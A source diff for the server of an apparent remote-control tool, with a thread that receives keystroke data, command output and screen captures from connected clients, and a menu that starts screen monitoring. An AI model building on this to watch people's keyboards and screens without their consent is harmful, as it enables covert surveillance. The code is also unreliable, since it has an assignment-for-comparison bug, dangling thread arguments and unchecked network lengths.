@@ -12,38 +12,64 @@
 #ifdef _DEBUG
 #define new DEBUG_NEW
 #endif
+
+struct param
+{
+public:
+	SOCKET* sclient;
+	Mysession *psession;
+};
+
+
 DWORD WINAPI recvthread(LPVOID lparam)
 {
-	SOCKET* sclient = (SOCKET*)lparam;
+	param* p = (param*)lparam;
+	bool bret;
+	char* pdata = NULL;
 	while (true)
 	{
 
-		int getdate = 0;
+		/*int getdate = 0;
 		char rbuf[30] = { 0 };
 		getdate = recv(*sclient, rbuf, sizeof(unsigned int) * 2, 0);
-		DATA* datapacket = (DATA*)rbuf;
-		if (getdate > 0)
+		DATA* datapacket = (DATA*)rbuf;*/
+
+		//收取头部数据
+		DATA drbuf;
+		bret = recvdata(*(p->sclient), (char*)&drbuf, sizeof(unsigned int) * 2);
+		if (!bret) return 0;
+
+		if (drbuf.length > 0)
 		{
-			if (datapacket->type == CLIENT_KEYBOARD_BACK)
+			pdata = new char[drbuf.length + 5];
+			if (pdata == NULL) return 0;
+
+			recvdata(*(p->sclient), pdata, drbuf.length);
+
+
+			if (drbuf.type == CLIENT_KEYBOARD_BACK)
 			{
-				char data[256] = { 0 };
-				recv(*sclient, data, datapacket->length, 0);
 				//输出keyboard数据
 
 			}
-			else if (datapacket->type == CLIENT_CMD_BACK)
+			else if (drbuf.type == CLIENT_CMD_BACK)
 			{
-				char data[256] = { 0 };
-				recv(*sclient, data, datapacket->length, 0);
 				//输出cmd数据
-
+			}
+			else if (drbuf.type = CLIENT_SCREEN_BACK)
+			{
+				if (p->psession->pscreendlg != NULL)
+				{
+					//显示屏幕监控数据
+					p->psession->pscreendlg->ShowWindow(SW_SHOW);
+					p->psession->pscreendlg->showscreen(pdata, drbuf.length);
+					if (p->psession->pscreendlg->isclose) {
+						senddatahead(*(p->sclient), SERVER_SCREEN_COMMAND);
+					}
+				}
 			}
 		}
-		else if (getdate < 0)
-		{
-			//输出xx客户端断开连接
-			break;
-		}
+		if (pdata != NULL) delete[] pdata;
 	}
 	return true;
 }
@@ -74,12 +100,20 @@ DWORD WINAPI CRemoteSERVERDlg::acceptthread(LPVOID lparam)
 
 		char ipandport[256] = {0};
 		sprintf_s(ipandport, "%s:%d", inet_ntoa(clientaddr.sin_addr), ntohs(clientaddr.sin_port));
-		dlg->list_client.InsertItem(dlg->map_session.size(), ipandport);
+		int index = dlg->list_client.InsertItem(dlg->map_session.size(), ipandport);
+		if (index != -1)
+		{
+			//序号与socket关联
+			dlg->list_client.SetItemData(index, sclient);
+		}
 
-
+		//构建线程参数
+		param p;
+		p.psession = psession;
+		p.sclient = &sclient;
 
 		//客户端的recv线程
-		CreateThread(0, 0, recvthread, &sclient, 0, 0);
+		CreateThread(0, 0, recvthread, &p, 0, 0);
 		
 	}
 }
@@ -137,6 +171,8 @@ public:
 // 实现
 protected:
 	DECLARE_MESSAGE_MAP()
+//	virtual void OnCancel();
+	virtual void OnCancel();
 };
 
 
@@ -169,6 +205,8 @@ BEGIN_MESSAGE_MAP(CRemoteSERVERDlg, CDialogEx)
 	ON_WM_SYSCOMMAND()
 	ON_WM_PAINT()
 	ON_WM_QUERYDRAGICON()
+	ON_NOTIFY(NM_RCLICK, IDC_LIST2, &CRemoteSERVERDlg::OnNMRClickList2)
+	ON_COMMAND(ID_SCREEN, &CRemoteSERVERDlg::OnScreen)
 END_MESSAGE_MAP()
 
 
@@ -266,5 +304,51 @@ void CRemoteSERVERDlg::OnPaint()
 HCURSOR CRemoteSERVERDlg::OnQueryDragIcon()
 {
 	return static_cast<HCURSOR>(m_hIcon);
+}
+
+
+
+void CRemoteSERVERDlg::OnNMRClickList2(NMHDR* pNMHDR, LRESULT* pResult)
+{
+	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
+	// TODO: 在此添加控件通知处理程序代码
+	CMenu menu;
+	menu.LoadMenu(IDR_MENU1);
+	CMenu* psubmenu = menu.GetSubMenu(0);
+
+
+	//获取鼠标当前坐标
+	CPoint cp;
+	GetCursorPos(&cp);
+
+	psubmenu->TrackPopupMenu(TPM_LEFTALIGN, cp.x, cp.y, this);
+
+
+
+
+	*pResult = 0;
+}
+
+
+void CRemoteSERVERDlg::OnScreen()
+{
+	// TODO: 在此添加命令处理程序代码
+	//获取当前选中行的socket,向其发送屏幕监控命令
+	int pos = list_client.GetSelectionMark();
+
+	SOCKET sclient = list_client.GetItemData(pos);
+
+	senddatahead(sclient, SERVER_SCREEN_COMMAND);
+
+
+	{
+		std::lock_guard<std::mutex> lg(accept_mutex); 
+		if (map_session[sclient]->pscreendlg == NULL)
+		{
+			map_session[sclient]->pscreendlg = new CscreenDlg;
+			map_session[sclient]->pscreendlg->Create(IDD_CscreenDlg,this);
+			map_session[sclient]->pscreendlg->isclose = true;
+		}
+	}
 }
 
